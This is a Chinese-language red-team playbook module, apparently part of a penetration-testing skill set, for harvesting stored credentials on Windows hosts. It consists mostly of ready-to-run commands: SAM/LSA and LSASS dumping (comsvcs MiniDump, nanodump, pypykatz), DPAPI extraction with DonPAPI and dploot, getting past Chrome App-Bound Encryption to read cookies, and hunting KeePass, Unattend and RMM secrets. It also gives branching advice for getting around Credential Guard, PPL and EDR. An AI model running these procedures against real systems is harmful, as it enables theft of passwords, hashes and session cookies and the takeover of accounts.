# Windows 凭据收割（SAM / LSA / LSASS / DPAPI / 浏览器 / RMM）

> **TECH：** 已有本机管理员或 SYSTEM 时提取存储凭据  
> **IMPACT：** NT 哈希、明文、cookie、DPAPI 机密  
> **成功：** 至少一条可校验的身份材料  
> **不是：** DCSync / NTDS / LAPS LDAP（`/ad-attack` `/ad-recon`）

前置：当前会话已是本地 admin 或 SYSTEM。低权限先 `/privesc-win`。

---

## 1. 远程 SAM / LSA（优先，少落地）

```bash
nxc smb TARGET -u administrator -p 'pass' --sam
nxc smb TARGET -u administrator -p 'pass' --lsa
impacket-secretsdump administrator:'pass'@TARGET
impacket-secretsdump -hashes :NTHASH administrator@TARGET
```

成功：本地 Administrator NT、LSA 里的服务口令/自动登录。域缓存 DCC2（`-m 2100`）能砸再砸。

`--ntds` / `-just-dc-user krbtgt` **不要在这里跑** → `/ad-attack`。

RESTORE：无持久改动。hashes 进 notes，不要留在桌面。

---

## 2. LSASS

### GATES

```powershell
Get-Process lsass
# Credential Guard / PPL
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

```text
Credential Guard 开  → dump 也没有明文 Kerberos/NT；转 SAM/DPAPI/喷洒
RunAsPPL / PPL      → 普通 MiniDump 失败；nanodump 或 /edr-bypass 后再 dump
无 PPL              → comsvcs 或 nanodump
EDR 杀 dump         → /edr-bypass → 返回本节
```

### 无 PPL

```cmd
for /f "tokens=2 delims=," %A in ('tasklist /FI "IMAGENAME eq lsass.exe" /FO csv /NH') do @echo %~A
rundll32 C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Public\l.dmp full
```

```bash
pypykatz lsa minidump l.dmp
```

远程：

```bash
nxc smb TARGET -u admin -p pass -M lsassy
nxc smb TARGET -u admin -p pass -M nanodump
```

### nanodump（PPL/EDR 环境优先于 mimikatz 落地）

https://github.com/fortra/nanodump

```cmd
nanodump.exe -w C:\Users\Public\1.bin
```

PPL 变体、fork、seclogon leak 以 **当前仓库 README** 为准（参数随版本变）。失败且进程被杀 → `/edr-bypass`（PPL/用户态），回来再 dump。不要默认加载 mimidrv。

成功：pypykatz 解析出 NT / 明文 / ticket。Ticket 文件候选 `/ad-recon`（先枚举再用），不要在这里 PTT 打 DA。

RESTORE：删 dump 文件。

---

## 3. DPAPI / DonPAPI / dploot

```bash
DonPAPI corp.com/administrator:'pass'@TARGET
DonPAPI corp.com/administrator:'pass'@192.168.50.0/24
dploot backupkey -u admin -p pass -d corp.com TARGET
dploot credentials -u admin -p pass -d corp.com TARGET
nxc smb TARGET -u admin -p pass -M dpapi
nxc smb TARGET -u admin -p pass -M rdcman
nxc smb TARGET -u admin -p pass -M wifi
```

覆盖：Credential Manager、RDP、WiFi、任务计划密码、部分浏览器（见下一节门控）。

本机：

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list
```

`DefaultPassword` 有值就是明文。Vault / Credential Manager 用 DonPAPI 比手搓 DPAPI blob 稳。

RESTORE：只读提取。不要改用户 masterkey。

---

## 4. 浏览器（含 Chrome 127+ App-Bound Encryption）

Chrome 127+ / 对应 Edge：cookie（以及后续密码/支付）走 **App-Bound Encryption（ABE / IElevator）**。用户上下文直接 DPAPI 会留下 `v20` 密文。

```text
Chrome <127 或 Login Data 仍 DPAPI  → DonPAPI / SharpChrome / LaZagne
Chrome 127+ v20 blob               → 需要 SYSTEM + 以 Chrome 身份调用 IElevator
                                     或 Chromium 远程调试 / 进程内存（ChromeKatz 类）
DonPAPI 出空或全是 v20             → 不要当“没有密码”，换 ABE 路径
```

公开工具（按当前 README，不要抄过期开关）：

- https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
- DonPAPI 新版本若声明支持 ABE，优先用它（少落地）

ABE 解密常要 SYSTEM。还在 Medium 用户 → 先 `/privesc-win` 或用已有 SYSTEM 会话。工具被签名校验/EDR 杀 → `/edr-bypass` 后回来。

Firefox：`key4.db` + `logins.json`，LaZagne / firefox_decrypt。无 ABE。

成功：cookie 能打到目标站 Set-Cookie 会话，或明文密码可登录。云控制台 cookie → 候选 `/cloud-recon`。AiTM 不在这里（`/phishing`）。

---

## 5. RMM / 备份 / 应用

高价值文件（有 admin 读盘时 Titus 也会扫到）：

```text
AnyDesk         %APPDATA%\AnyDesk
TeamViewer      %APPDATA%\TeamViewer
ConnectWise / ScreenConnect
Splashtop
Veeam           数据库/配置里的备份口令（版本洞走 cve-enrichment，本模块要的是 secret）
KeePass         *.kdbx → keepass2john
CyberArk / 本地 vault 导出文件
Unattend.xml / sysprep / setup complete
```

```cmd
dir /s /b C:\Users\*.kdbx C:\Windows\Panther\Unattend.xml C:\unattend.xml 2>nul
```

解出的 RMM 口令当普通密码复用。不要在 `/creds` 里装 RMM 后门（`/post`）。

---

## 6. HiveNightmare 残留

`C:\Windows\System32\config\SAM` 对 Users 可读或存在旧 VSS → 那是 **提权路径**，配方在 `../../privesc-win/references/kernel-lpe.md`。本模块只接收已经拷出来的 SAM 做 secretsdump。

---

## IMPACT

LSASS dump 是高噪声。授权测试优先远程 `--sam/--lsa`。PPL/CG 门不过就换路，不要循环 MiniDump 把唯一 shell 打挂。
